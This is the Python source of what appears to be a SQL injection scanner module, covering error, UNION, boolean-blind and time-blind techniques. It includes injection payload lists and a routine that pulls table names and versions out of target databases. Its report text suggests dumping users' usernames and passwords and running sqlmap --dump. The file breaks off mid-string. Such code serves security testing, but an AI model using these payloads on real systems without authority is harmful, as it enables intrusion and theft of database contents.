"""SQL Injection detection module.

Implements three detection strategies:
  1. Error-based  — trigger DB error messages with malformed input.
  2. Boolean-based blind — compare page content between always-true and
     always-false conditions.
  3. Time-based blind — measure response delay caused by SLEEP/WAITFOR payloads.

Injection modes
---------------
  - Replace: the entire parameter value is replaced by the payload.
  - Append:  the payload is appended to the original value.

The append mode is critical for numeric parameters (e.g. ``id=1``).
Injecting ``'`` in replace mode gives ``id=``'`` — syntactically valid SQL that
returns empty results without any error.  Injecting in append mode gives
``id=1'`` — a genuine syntax error that exposes the vulnerability.
"""

import re
import time
from typing import Dict, List, Optional, Tuple

import logging

from .base import BaseModule, Finding
from ..confirm import confirm_time_based
from ..parser import build_curl_command, rebuild_url_with_params

logger = logging.getLogger("vulnscanner")

# ---------------------------------------------------------------------------
# DB error signatures  (pattern, DBMS label)
# ---------------------------------------------------------------------------
_ERROR_SIGS: List[Tuple[str, str]] = [
    (r"you have an error in your sql syntax", "MySQL"),
    (r"warning:\s*mysql", "MySQL"),
    (r"mysql_fetch", "MySQL"),
    (r"supplied argument is not a valid mysql", "MySQL"),
    (r"column count doesn't match value count", "MySQL"),
    (r"unclosed quotation mark", "MSSQL"),
    (r"incorrect syntax near", "MSSQL"),
    (r"microsoft sql server", "MSSQL"),
    (r"\[microsoft\]\[odbc", "MSSQL"),
    (r"mssql_query\(\)", "MSSQL"),
    (r"ora-\d{4,5}", "Oracle"),
    (r"oracle error", "Oracle"),
    (r"oracle.*driver", "Oracle"),
    (r"sqlite3::", "SQLite"),
    (r"sqlite\.exception", "SQLite"),
    (r"syntax error.*sqlite", "SQLite"),
    (r"pg_query\(\)", "PostgreSQL"),
    (r"postgresql.*error", "PostgreSQL"),
    (r"valid postgresql result", "PostgreSQL"),
    (r"psql.*error", "PostgreSQL"),
    (r"division by zero", "Generic"),
    (r"sql syntax.*mysql", "MySQL"),
    (r"warning.*mysql_", "MySQL"),
]

# ---------------------------------------------------------------------------
# Error-based payloads
# ---------------------------------------------------------------------------

# Appended to the original value — critical for numeric parameters.
# e.g. original "1"  →  injected "1'"   →  SQL: WHERE id=1'  (syntax error)
_APPEND_ERROR_SUFFIXES: List[str] = [
    "'",
    '"',
    "\\",
    "'--",
    "'#",
    "' --",
    "'/*",
    "') --",
    "')) --",
]

# Replace-mode payloads — replace the value entirely.
# Better suited for string parameters or when we don't know the original value.
_REPLACE_ERROR_PAYLOADS: List[str] = [
    "'",
    '"',
    "\\",
    "'--",
    "'#",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' GROUP BY columnnames HAVING 1=1--",
    "1 AND 1=CONVERT(int,(SELECT @@version))--",
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
]

# ---------------------------------------------------------------------------
# Boolean-based blind payloads
# ---------------------------------------------------------------------------

# Append-mode AND pairs — ideal for numeric params.
# TRUE:  id=1 AND 1=1  →  same result as baseline
# FALSE: id=1 AND 1=2  →  empty / fewer results
_APPEND_AND_PAIRS: List[Tuple[str, str]] = [
    (" AND 1=1",          " AND 1=2"),
    (" AND 1=1--",        " AND 1=2--"),
    (" AND 1=1#",         " AND 1=2#"),
    (" AND 'a'='a'--",    " AND 'a'='b'--"),
    (") AND (1=1",        ") AND (1=2"),
    (") AND (1=1)--",     ") AND (1=2)--"),
]

# Replace-mode pairs — better for string parameters.
_REPLACE_BOOL_PAIRS: List[Tuple[str, str]] = [
    ("' OR '1'='1",         "' OR '1'='2"),
    ("' OR 1=1--",          "' OR 1=2--"),
    ("1' OR '1'='1'--",     "1' OR '1'='2'--"),
    ("\" OR \"1\"=\"1\"--", "\" OR \"1\"=\"2\"--"),
    ("1 OR 1=1",            "1 OR 1=2"),
    ("' OR 'x'='x",         "' OR 'x'='y"),
    ("1) OR (1=1)--",       "1) OR (1=2)--"),
]

# ---------------------------------------------------------------------------
# Time-based blind payloads
# ---------------------------------------------------------------------------

# (template with {delay} and optional {orig} placeholder, DBMS label, append?)
# append=True → suffix appended to original value
# append=False → value replaced entirely
_TIME_PAYLOADS: List[Tuple[str, str, bool]] = [
    # Append-mode (numeric-safe)
    (" AND SLEEP({delay})--",             "MySQL",      True),
    (" AND SLEEP({delay})#",              "MySQL",      True),
    (" OR SLEEP({delay})--",              "MySQL",      True),
    (" OR SLEEP({delay})#",               "MySQL",      True),
    ("; WAITFOR DELAY '0:0:{delay}'--",   "MSSQL",      True),
    ("; SELECT pg_sleep({delay})--",      "PostgreSQL", True),
    # Replace-mode fallbacks
    ("' OR SLEEP({delay})--",             "MySQL",      False),
    ("1 OR SLEEP({delay})",               "MySQL",      False),
    ("' AND SLEEP({delay}) AND '1'='1",   "MySQL",      False),
    ("'; WAITFOR DELAY '0:0:{delay}'--",  "MSSQL",      False),
    ("'; SELECT pg_sleep({delay})--",     "PostgreSQL", False),
]


class SQLiScanner(BaseModule):
    """Detects SQL injection via error-based, boolean-based, and time-based methods."""

    NAME = "sqli"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self.delay = float(config.get("delay_threshold", 5.0))
        self.custom_payloads: Optional[str] = config.get("custom_payloads")

    # ------------------------------------------------------------------
    # Public entry-point
    # ------------------------------------------------------------------

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        """Run all three SQLi detection strategies against *param_name*.

        A single baseline request is taken upfront and shared across all three
        strategies to avoid the cost of separate baseline calls per strategy.
        """
        baseline_resp = self._send(url, method, params)
        baseline_text = baseline_resp.text if baseline_resp is not None else ""

        finding = (
            self._test_error_based(url, method, params, param_name, baseline_text)
            or self._test_union_based(url, method, params, param_name, baseline_text)
            or self._test_boolean_based(url, method, params, param_name)
            or self._test_time_based(url, method, params, param_name)
            or self._test_orm_injection(url, method, params, param_name, baseline_text)
        )
        return [finding] if finding else []

    # ------------------------------------------------------------------
    # Injection helpers
    # ------------------------------------------------------------------

    def _replace(self, params: Dict, name: str, payload: str) -> Dict:
        """Return params with *name* replaced by *payload*."""
        return {**params, name: payload}

    def _append(self, params: Dict, name: str, suffix: str) -> Dict:
        """Return params with *suffix* appended to the existing value of *name*."""
        return {**params, name: params.get(name, "") + suffix}

    def _send(self, url: str, method: str, params: Dict[str, str]):
        if method == "GET":
            return self.http.get(rebuild_url_with_params(url, params))
        return self.http.post(url, data=params)

    # ------------------------------------------------------------------
    # Strategy 1: Error-based
    # ------------------------------------------------------------------

    def _test_error_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        baseline_text: str = "",
    ) -> Optional[Finding]:
        """Inject malformed SQL and look for DB error messages in the response.

        Tests append-mode first (critical for numeric parameters like id=1),
        then falls back to replace-mode payloads.  *baseline_text* is compared
        so that SQL error strings already present in the normal page (e.g. a
        page that mentions "mysql" in a tutorial) do not trigger a false positive.
        """
        baseline_lower = baseline_text.lower()

        # Append-mode: e.g. id=1 → id=1'
        for suffix in _APPEND_ERROR_SUFFIXES:
            injected_params = self._append(params, param_name, suffix)
            finding = self._check_error_response(
                url, method, injected_params, param_name,
                display_payload=f"{params.get(param_name, '')}{suffix}",
                baseline_lower=baseline_lower,
            )
            if finding:
                return finding

        # Replace-mode: e.g. id=' OR '1'='1
        for payload in self.load_payloads(_REPLACE_ERROR_PAYLOADS, self.custom_payloads):
            injected_params = self._replace(params, param_name, payload)
            finding = self._check_error_response(
                url, method, injected_params, param_name,
                display_payload=payload,
                baseline_lower=baseline_lower,
            )
            if finding:
                return finding

        return None

    def _check_error_response(
        self,
        url: str,
        method: str,
        injected_params: Dict,
        param_name: str,
        display_payload: str,
        baseline_lower: str = "",
    ) -> Optional[Finding]:
        """Send one request and check the response for SQL error signatures.

        Only flags a pattern if it is NOT already present in *baseline_lower*,
        preventing false positives on pages that mention database names in their
        static content (e.g. documentation, tutorial pages).
        """
        resp = self._send(url, method, injected_params)
        if resp is None:
            return None

        body_lower = resp.text.lower()
        for pattern, dbms in _ERROR_SIGS:
            # Skip patterns already present in the baseline response
            if re.search(pattern, baseline_lower, re.IGNORECASE):
                continue
            if re.search(pattern, body_lower, re.IGNORECASE):
                match = re.search(pattern, body_lower, re.IGNORECASE)
                start = max(0, match.start() - 30)
                end = min(len(resp.text), match.end() + 80)
                snippet = resp.text[start:end].replace("\n", " ").strip()

                logger.debug(
                    "[SQLi/Error] %s=%r matched pattern=%r (%s)",
                    param_name, display_payload, pattern, dbms,
                )
                curl = build_curl_command(url, method, injected_params, param_name, display_payload)
                return Finding(
                    vuln_type="SQL Injection (Error-based)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=display_payload,
                    evidence=f'DB error signature "{pattern}" ({dbms}): ...{snippet!r}...',
                    confidence="high",
                    details=(
                        f"{dbms} error exposed in HTTP response. "
                        f"Payload: {display_payload!r}. "
                        "Remediation: use parameterised queries / prepared statements."
                    ),
                    reproduction=(
                        f"# 1. Send the payload and look for DB error in the response:\n"
                        f"{curl}\n"
                        f"# 2. Search for the error pattern in the output:\n"
                        f"$ # Look for: {pattern!r}\n"
                        f"# 3. If the {dbms} error message appears, the param is injectable.\n"
                        f"# 4. Try sqlmap for automated exploitation:\n"
                        f"$ sqlmap -u \"{url}\" --data \"{param_name}={display_payload}\" --batch"
                        if method == "POST" else
                        f"# 1. Send the payload and look for DB error in the response:\n"
                        f"{curl}\n"
                        f"# 2. Search for the error pattern in the output:\n"
                        f"$ # Look for: {pattern!r}\n"
                        f"# 3. If the {dbms} error message appears, the param is injectable.\n"
                        f"# 4. Try sqlmap for automated exploitation:\n"
                        f"$ sqlmap -u \"{url}?{param_name}={display_payload}\" --batch"
                    ),
                )
        return None

    # ------------------------------------------------------------------
    # Strategy 1b: UNION-based (in-band extraction — solid, visible proof)
    # ------------------------------------------------------------------

    def _test_union_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        baseline_text: str = "",
    ) -> Optional[Finding]:
        """Confirm SQLi by making the database RETURN attacker-chosen data.

        This is the proof a human can actually see: instead of "the response was
        37 bytes shorter" (blind/boolean), we get the DB to print real values
        (table names, version, dumped rows) straight into the page.

        Anti-false-positive oracle — the hard part:
            The injected payload is usually reflected back in the page (search
            boxes echo the query). So we can't just look for our marker — we'd
            match the *reflection*, not real execution. Instead we inject a marker
            built by SQL string concatenation, e.g.  'qxab'||'cdef'  (or
            CONCAT('qxab','cdef') on MySQL). Only a database that EXECUTED the
            query produces the joined value 'qxabcdef'. The reflected payload
            still shows the pipes/CONCAT, never the joined token. So finding the
            joined token = proof of execution, immune to reflection.
        """
        import random as _r
        import string as _s

        # --- Cheap injectability gate (2 requests) ---
        # A single quote breaks SQL syntax; a doubled quote ('') is balanced and
        # behaves like normal input. If the two responses differ (size or status),
        # the quote is reaching the SQL engine → worth the heavier UNION search.
        # If they're identical AND no server error, the param almost certainly
        # isn't in a SQL string context — skip the ~100 UNION probes entirely.
        q1 = self._send(url, method, self._append(params, param_name, "'"))
        q2 = self._send(url, method, self._append(params, param_name, "''"))
        if q1 is not None and q2 is not None:
            size_delta = abs(len(q1.text) - len(q2.text))
            base_len = max(1, len(q2.text))
            same_status = q1.status_code == q2.status_code
            no_error = q1.status_code < 500
            if same_status and no_error and size_delta <= max(15, int(base_len * 0.02)):
                logger.debug(
                    "[SQLi/UNION] %s: quote has no effect (' == '') — skipping UNION",
                    param_name,
                )
                return None

        orig = params.get(param_name, "")
        t1 = "".join(_r.choices(_s.ascii_lowercase, k=4))
        t2 = "".join(_r.choices(_s.ascii_lowercase, k=4))
        joined = t1 + t2  # appears ONLY if the DB concatenated → executed

        # (dialect_label, marker-builder, extraction expressions to try after)
        dialects = [
            ("pipe", lambda a, b: f"'{a}'||'{b}'", [
                "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
                "sqlite_version()",
                "(SELECT group_concat(table_name) FROM information_schema.tables)",
                "version()",
            ]),
            ("concat", lambda a, b: f"CONCAT('{a}','{b}')", [
                "(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())",
                "version()",
            ]),
        ]
        # Injection contexts (string / numeric / parenthesised) and comment styles.
        # Trimmed to the highest-yield few: the search space is cols × dialects ×
        # prefixes × fillers, so every extra prefix multiplies request cost against
        # what is often a single-threaded target.
        prefixes = [
            "{orig}' UNION SELECT {cols}-- -",
            "{orig}) UNION SELECT {cols}-- -",
            "-1 UNION SELECT {cols}-- -",
            '{orig}" UNION SELECT {cols}-- -',
        ]
        max_cols = 8
        # Filler values for the non-marker columns. Many real apps render each
        # UNION row through a template that expects specific column TYPES (e.g. a
        # numeric price). A NULL or a string in a numeric column makes that render
        # crash (HTTP 500) even though the injection worked — so we put our string
        # marker in ONE column and fill the rest with type-compatible dummies,
        # trying a numeric filler first (covers price/id columns) then a string.
        fillers = ["1", "'okr'"]
        # Hard request budget so a param that passes the cheap gate but isn't
        # actually UNION-injectable can't explode into hundreds of requests.
        budget = 80
        sent = 0

        # n in the OUTER loop with dialect/prefix/filler inner means the common
        # case (correct column count, first dialect/prefix) is hit within a few
        # requests, while both DB dialects still get a chance at every n.
        for n in range(1, max_cols + 1):
            for d_label, mk, extractors in dialects:
                marker = mk(t1, t2)
                col_variants = (
                    [",".join([marker] + [f] * (n - 1)) for f in fillers]
                    if n > 1 else [marker]
                )
                for cols in col_variants:
                    for tpl in prefixes:
                        if sent >= budget:
                            logger.debug("[SQLi/UNION] %s: budget exhausted", param_name)
                            return None
                        payload = tpl.format(orig=orig, cols=cols)
                        resp = self._send(url, method, self._replace(params, param_name, payload))
                        sent += 1
                        if resp is None:
                            continue
                        body = resp.text or ""
                        # Execution proof: joined token present AND not in baseline.
                        if joined in body and joined not in baseline_text:
                            logger.debug(
                                "[SQLi/UNION] %s: confirmed — %d cols, dialect=%s, prefix=%r",
                                param_name, n, d_label, tpl,
                            )
                            extracted = self._union_extract(
                                url, method, params, param_name, tpl, n, mk, t1, t2, extractors,
                            )
                            return self._make_union_finding(
                                url, method, params, param_name, payload, n, d_label,
                                joined, extracted,
                            )
        return None

    def _union_extract(
        self, url, method, params, param_name, tpl, n, mk, t1, t2, extractors,
    ) -> Optional[str]:
        """Pull real data out via UNION, wrapped in our markers so we can locate it.

        We place  t1 || (<expr>) || t2  in the first column so the extracted value
        lands between two known tokens; then we slice it out of the response.
        Returns the extracted string (e.g. comma-separated table names) or None.
        """
        for expr in extractors:
            # Build: t1 || (expr) || t2  in col 0 so the loot lands between markers;
            # type-compatible fillers in the rest (same reason as the detection
            # phase — NULL/string in a numeric column would crash the row render).
            first_col = f"'{t1}'||({expr})||'{t2}'" if "||" in mk("a", "b") \
                else f"CONCAT('{t1}',({expr}),'{t2}')"
            for filler in ("1", "'okr'"):
                cols = ",".join([first_col] + [filler] * (n - 1)) if n > 1 else first_col
                payload = tpl.format(orig=params.get(param_name, ""), cols=cols)
                resp = self._send(url, method, self._replace(params, param_name, payload))
                if resp is None:
                    continue
                data = self._extract_between(resp.text or "", t1, t2)
                if data:
                    return data
        return None

    @staticmethod
    def _extract_between(text: str, t1: str, t2: str) -> Optional[str]:
        """Return the substring the DB placed between markers t1…t2 (the loot)."""
        # Look for t1<DATA>t2 where DATA is the extracted value (not the literal
        # reflected payload, which would contain quotes/|| between the tokens).
        for m in re.finditer(re.escape(t1) + r"(.*?)" + re.escape(t2), text, re.DOTALL):
            chunk = m.group(1)
            # Skip the reflected payload itself (contains our SQL syntax).
            if "||" in chunk or "CONCAT(" in chunk.upper() or "SELECT" in chunk.upper():
                continue
            chunk = chunk.strip()
            if chunk:
                return chunk[:300]
        return None

    def _make_union_finding(
        self, url, method, params, param_name, payload, n_cols, dialect,
        joined, extracted,
    ) -> Finding:
        proof = (
            f"Extracted live data via UNION: {extracted!r}"
            if extracted else
            f"Database executed our injected UNION SELECT and printed the computed "
            f"value {joined!r} into the page"
        )
        loot_line = (
            f"#    -> The database returned: {extracted}\n"
            if extracted else
            f"#    -> The page now contains '{joined}', which only exists if the DB ran our query.\n"
        )
        return Finding(
            vuln_type="SQL Injection (UNION-based, in-band)",
            url=url,
            method=method,
            parameter=param_name,
            payload=payload,
            evidence=(
                f"{proof}. The {param_name!r} parameter is injectable; a {n_cols}-column "
                f"UNION SELECT ({dialect} dialect) returns attacker-controlled rows."
            ),
            # In-band data extraction is the strongest SQLi signal there is.
            confidence="high",
            details=(
                f"In plain terms: the '{param_name}' field is plugged directly into a SQL "
                f"query, and we were able to bolt on our OWN query with UNION SELECT and "
                f"make the database hand back whatever we ask for"
                + (f" — here it returned: {extracted}." if extracted else ".") + "\n"
                f"This is NOT a guess based on response size — the database literally "
                f"printed our requested data into the page, which is undeniable proof.\n"
                f"Why it matters: an attacker can dump any table — users, password "
                f"hashes, orders, secrets — from this one input.\n"
                f"Fix: use parameterised queries / prepared statements so input is sent "
                f"as data, never concatenated into the SQL text."
            ),
            reproduction=(
                f"# --- How to see it for yourself (in-band UNION dump) ---\n"
                f"# 1. The query has {n_cols} column{'s' if n_cols != 1 else ''}. "
                f"Send this value in '{param_name}':\n"
                f"#        {payload}\n"
                f"# 2. Load the page / run the curl below and read the output:\n"
                + loot_line +
                f"# 3. Now dump a real table (example — adjust table/column names):\n"
                f"#    {param_name}={params.get(param_name,'')}' UNION SELECT "
                f"{'username,password' + ',NULL' * max(0, n_cols - 2) if n_cols >= 2 else 'username'} "
                f"FROM users-- -\n"
                f"# 4. The usernames/passwords appear right in the page. That is a full\n"
                f"#    database read through one input field.\n"
                f"{build_curl_command(url, method, params, param_name, payload)}\n"
                f"# Or let sqlmap automate the dump:\n"
                f"$ sqlmap -u \"{url}\" -p {param_name} --batch --dump"
            ),
        )

    # ------------------------------------------------------------------
    # Strategy 2: Boolean-based blind
    # ------------------------------------------------------------------

    def _test_boolean_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Compare responses for always-true vs always-false SQL conditions.

        Tests append-mode AND pairs first (numeric-safe), then replace-mode OR pairs.

        Stability check: two baseline requests are taken before any injection.
        If the responses differ significantly (ads, timestamps, CSRF nonces make pages
        dynamic), boolean detection is skipped entirely — those pages would produce
        false positives with any size-based comparison strategy.
        """
        baseline = self._send(url, method, params)
        if baseline is None:
            return None
        baseline_len = len(baseline.text)

        # Tolerance: within 10 % of baseline (min 30 bytes) counts as "same"
        tolerance = max(30, int(baseline_len * 0.10))
        # Meaningful difference: at least 10 % of baseline (min 50 bytes)
        min_diff = max(50, int(baseline_len * 0.10))

        # Stability check: a second clean request reveals dynamic pages.
        # If the two baselines differ by more than the tolerance, the page
        # changes between requests (ads, random tokens, timestamps) — boolean
        # detection would be meaningless and prone to false positives.
        baseline2 = self._send(url, method, params)
        if baseline2 is not None:
            drift = abs(len(baseline2.text) - baseline_len)
            if drift > tolerance:
                logger.debug(
                    "[SQLi/Boolean] page is dynamic (baseline1=%d baseline2=%d drift=%d) — skip",
                    baseline_len, len(baseline2.text), drift,
                )
                return None

        # --- Append-mode AND pairs (numeric-safe) ---
        for true_sfx, false_sfx in _APPEND_AND_PAIRS:
            orig = params.get(param_name, "")
            true_pl  = f"{orig}{true_sfx}"
            false_pl = f"{orig}{false_sfx}"

            r_true  = self._send(url, method, self._append(params, param_name, true_sfx))
            r_false = self._send(url, method, self._append(params, param_name, false_sfx))

            if r_true is None or r_false is None:
                continue

            finding = self._evaluate_bool_pair(
                url, method, param_name, baseline_len, tolerance, min_diff,
                r_true, r_false, true_pl, false_pl,
            )
            if finding:
                if self._reconfirm_bool(
                    url, method, params, param_name, true_sfx, false_sfx,
                    append=True, baseline_len=baseline_len,
                    tolerance=tolerance, min_diff=min_diff,
                ):
                    return finding
                logger.debug(
                    "[SQLi/Boolean/AND] %s: candidate not reproducible on re-test — "
                    "discarding (FP guard)", param_name,
                )
                continue

        # --- Replace-mode OR pairs ---
        for true_pl, false_pl in _REPLACE_BOOL_PAIRS:
            r_true  = self._send(url, method, self._replace(params, param_name, true_pl))
            r_false = self._send(url, method, self._replace(params, param_name, false_pl))

            if r_true is None or r_false is None:
                continue

            finding = self._evaluate_bool_pair(
                url, method, param_name, baseline_len, tolerance, min_diff,
                r_true, r_false, true_pl, false_pl,
            )
            if finding:
                if self._reconfirm_bool(
                    url, method, params, param_name, true_pl, false_pl,
                    append=False, baseline_len=baseline_len,
                    tolerance=tolerance, min_diff=min_diff,
                ):
                    return finding
                logger.debug(
                    "[SQLi/Boolean/OR] %s: candidate not reproducible on re-test — "
                    "discarding (FP guard)", param_name,
                )
                continue

        return None

    @staticmethod
    def _classify_bool_pair(
        r_true, r_false, baseline_len: int, tolerance: int, min_diff: int,
    ) -> Optional[str]:
        """Return the signal kind ("AND"/"OR"/"status-code") for a true/false
        response pair, or ``None`` when the pair shows no boolean-SQLi signal."""
        t_len = len(r_true.text)
        f_len = len(r_false.text)
        diff = abs(t_len - f_len)

        true_near_baseline = abs(t_len - baseline_len) <= tolerance
        false_near_baseline = abs(f_len - baseline_len) <= tolerance

        if true_near_baseline and diff >= min_diff:
            return "AND"
        if false_near_baseline and diff >= min_diff:
            return "OR"
        if r_true.status_code != r_false.status_code:
            return "status-code"
        return None

    def _reconfirm_bool(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        true_str: str,
        false_str: str,
        *,
        append: bool,
        baseline_len: int,
        tolerance: int,
        min_diff: int,
    ) -> bool:
        """Re-send the same true/false pair and require the signal to reproduce.

        Dynamic pages (ads, nonces, timestamps) produce a size delta once by
        chance but rarely reproduce the *same* delta a second time.  Requiring
        the signal to survive a re-test is the single biggest false-positive
        guard for size-based boolean detection.
        """
        if append:
            r_true = self._send(url, method, self._append(params, param_name, true_str))
            r_false = self._send(url, method, self._append(params, param_name, false_str))
        else:
            r_true = self._send(url, method, self._replace(params, param_name, true_str))
            r_false = self._send(url, method, self._replace(params, param_name, false_str))

        if r_true is None or r_false is None:
            return False
        return self._classify_bool_pair(
            r_true, r_false, baseline_len, tolerance, min_diff,
        ) is not None

    def _evaluate_bool_pair(
        self,
        url: str,
        method: str,
        param_name: str,
        baseline_len: int,
        tolerance: int,
        min_diff: int,
        r_true,
        r_false,
        true_pl: str,
        false_pl: str,
    ) -> Optional[Finding]:
        """Determine if the true/false response pair signals blind SQLi.

        The actual classification lives in :meth:`_classify_bool_pair` so the
        same logic can be reused by :meth:`_reconfirm_bool` for the re-test that
        guards against dynamic-page false positives.
        """
        t_len = len(r_true.text)
        f_len = len(r_false.text)
        diff  = abs(t_len - f_len)

        kind = self._classify_bool_pair(
            r_true, r_false, baseline_len, tolerance, min_diff,
        )
        if kind is not None:
            logger.debug(
                "[SQLi/Boolean/%s] %s: baseline=%d true=%d false=%d diff=%d",
                kind, param_name, baseline_len, t_len, f_len, diff,
            )
            curl_true = build_curl_command(url, method, {param_name: ""}, param_name, true_pl)
            curl_false = build_curl_command(url, method, {param_name: ""}, param_name, false_pl)
            # Concrete proof: show the actual VISIBLE content that appears under the
            # always-true condition and vanishes under always-false — far more
            # convincing than a byte count.
            visible = self._visible_diff_sample(r_true.text, r_false.text)
            visible_note = (
                f" The always-TRUE page shows content that the always-FALSE page "
                f"does not, e.g.: {visible!r}."
                if visible else ""
            )
            return Finding(
                vuln_type="SQL Injection (Boolean-based Blind)",
                url=url,
                method=method,
                parameter=param_name,
                payload=f"TRUE: {true_pl!r}  /  FALSE: {false_pl!r}",
                evidence=(
                    f"Same input, one logical tweak, two different pages: the always-true "
                    f"condition returned {t_len} B and the always-false condition {f_len} B "
                    f"(baseline {baseline_len} B, pattern={kind})."
                    + visible_note
                ),
                confidence="medium",
                details=(
                    f"In plain terms: the '{param_name}' value goes into a SQL query. We "
                    f"sent two versions that are identical except for a condition that is "
                    f"always TRUE ({true_pl!r}) vs always FALSE ({false_pl!r}). The page "
                    f"changed between them, which only happens if the database is "
                    f"evaluating our condition — i.e. our input reaches the SQL engine.\n"
                    f"This is 'blind' SQLi: the page doesn't print data directly, so proof "
                    f"comes from the page reacting to true/false logic"
                    + (f" (visible change: {visible!r})" if visible else "") + ".\n"
                    f"Note: blind SQLi can still be escalated to a full data dump (the "
                    f"scanner tries UNION first; if that had worked you'd see exact data "
                    f"instead). Confirm/exploit with sqlmap.\n"
                    f"Fix: use parameterised queries / prepared statements."
                ),
                reproduction=(
                    f"# --- Why this proves SQL injection (read slowly) ---\n"
                    f"# The two requests below are the SAME except for the logic at the end:\n"
                    f"#   TRUE  condition: {true_pl}\n"
                    f"#   FALSE condition: {false_pl}\n"
                    f"# A normal app ignores both and returns the same page. A vulnerable\n"
                    f"# app runs them as SQL, so the page CHANGES between true and false.\n"
                    f"#\n"
                    f"# 1. Send the always-TRUE version:\n"
                    f"{curl_true}\n"
                    f"#    -> returns ~{t_len} bytes"
                    + (f" and INCLUDES: {visible!r}\n" if visible else "\n") +
                    f"# 2. Send the always-FALSE version:\n"
                    f"{curl_false}\n"
                    f"#    -> returns ~{f_len} bytes"
                    + (f" and is MISSING that content\n" if visible else "\n") +
                    f"# 3. Different result for true vs false = the database is running our\n"
                    f"#    input. Confirmed blind SQL injection.\n"
                    f"# 4. Dump the data automatically:\n"
                    f"$ sqlmap -u \"{url}\" -p {param_name} --batch --dump"
                ),
            )
        return None

    @staticmethod
    def _visible_diff_sample(true_text: str, false_text: str) -> Optional[str]:
        """Return a short, human-readable line that is present in the TRUE page
        but absent from the FALSE page (concrete evidence of the logic change).

        We compare visible-ish lines and return the first meaningful one that the
        FALSE response lacks, so the report can say 'you literally see X appear'.
        """
        if not true_text:
            return None
        false_text = false_text or ""
        # Strip tags crudely to compare visible text lines.
        def _lines(html: str):
            txt = re.sub(r"<[^>]+>", " ", html)
            return [ln.strip() for ln in re.split(r"[\n\r]+", txt) if len(ln.strip()) >= 8]
        true_lines = _lines(true_text)
        false_set = set(_lines(false_text))
        for ln in true_lines:
            if ln not in false_set and not ln.lower().startswith(("http", "<!--")):
                # Avoid boilerplate that's just whitespace/punctuation.
                if any(c.isalnum() for c in ln):
                    return ln[:120]
        return None

    # ------------------------------------------------------------------
    # Strategy 3: Time-based blind
    # ------------------------------------------------------------------

    def _test_time_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Multi-sample time-based blind SQLi detection.

        Takes 3 baseline measurements to establish mean + standard deviation.
        Skips detection when std > 2s (CDN/unstable server — false positive risk).
        Threshold = avg + max(delay, 3*std + delay*0.5).
        """
        _baseline_times: List[float] = []
        baseline_resp = None
        for _ in range(3):
            t0 = time.perf_counter()
            r = self._send(url, method, params)
            elapsed = time.perf_counter() - t0
            if r is not None:
                _baseline_times.append(elapsed)
                baseline_resp = r

        if not _baseline_times or baseline_resp is None:
            return None

        avg_baseline = sum(_baseline_times) / len(_baseline_times)
        if len(_baseline_times) > 1:
            variance = sum((t - avg_baseline) ** 2 for t in _baseline_times) / (len(_baseline_times) - 1)
            std_baseline = variance ** 0.5
        else:
            std_baseline = avg_baseline * 0.5

        # CDN/unstable — skip time-based to avoid false positives
        if std_baseline > 2.0:
            logger.debug(
                "[SQLi/Time] %s: baseline std=%.2fs > 2s — too unstable, skipping",
                param_name, std_baseline,
            )
            return None

        threshold = max(
            avg_baseline + self.delay,
            avg_baseline + 3 * std_baseline + self.delay * 0.5,
        )
        delay_sec = int(self.delay)

        for template, dbms, append_mode in _TIME_PAYLOADS:
            suffix_or_payload = template.format(delay=delay_sec)

            if append_mode:
                injected = self._append(params, param_name, suffix_or_payload)
                display  = f"{params.get(param_name, '')}{suffix_or_payload}"
            else:
                injected = self._replace(params, param_name, suffix_or_payload)
                display  = suffix_or_payload

            t0 = time.perf_counter()
            resp = self._send(url, method, injected)
            elapsed = time.perf_counter() - t0

            if resp is None:
                continue

            if elapsed >= threshold:
                # --- Differential-timing confirmation (false-positive guard) ---
                # A real SLEEP(n) scales with n: re-test with 2x the delay and
                # require the response time to grow proportionally.  A one-off
                # network spike will not reproduce a second, proportional delay.
                def _measure(d_seconds: float):
                    sfx = template.format(delay=int(d_seconds))
                    if append_mode:
                        probe = self._append(params, param_name, sfx)
                    else:
                        probe = self._replace(params, param_name, sfx)
                    t = time.perf_counter()
                    r = self._send(url, method, probe)
                    if r is None:
                        return None
                    return time.perf_counter() - t

                confirmed, second_elapsed = confirm_time_based(
                    _measure, float(delay_sec), elapsed, avg_baseline,
                )
                if not confirmed:
                    logger.debug(
                        "[SQLi/Time] %s=%r candidate NOT confirmed by 2x re-test "
                        "(first=%.2fs second=%s) — skipping (FP guard)",
                        param_name, display, elapsed,
                        f"{second_elapsed:.2f}s" if second_elapsed is not None else "n/a",
                    )
                    continue

                logger.debug(
                    "[SQLi/Time] %s=%r elapsed=%.2fs baseline=%.2fs confirmed@2x=%.2fs (%s)",
                    param_name, display, elapsed, avg_baseline, second_elapsed, dbms,
                )
                curl = build_curl_command(url, method, params, param_name, display)
                return Finding(
                    vuln_type="SQL Injection (Time-based Blind)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=display,
                    evidence=(
                        f"Response delayed {elapsed:.2f}s with {delay_sec}s sleep payload, "
                        f"confirmed at {2 * delay_sec}s sleep ({second_elapsed:.2f}s) "
                        f"(baseline avg={avg_baseline:.2f}s ±{std_baseline:.2f}s, DBMS: {dbms})"
                    ),
                    confidence="high",
                    details=(
                        f"Time-based blind SQLi ({dbms}): payload caused {elapsed:.2f}s "
                        f"delay vs {avg_baseline:.2f}s±{std_baseline:.2f}s baseline (3 samples), "
                        f"and a 2x-sleep re-test scaled to {second_elapsed:.2f}s "
                        f"(differential-timing confirmed). "
                        "Remediation: use parameterised queries / prepared statements."
                    ),
                    reproduction=(
                        f"# 1. Measure baseline response time (run 3x to confirm stability):\n"
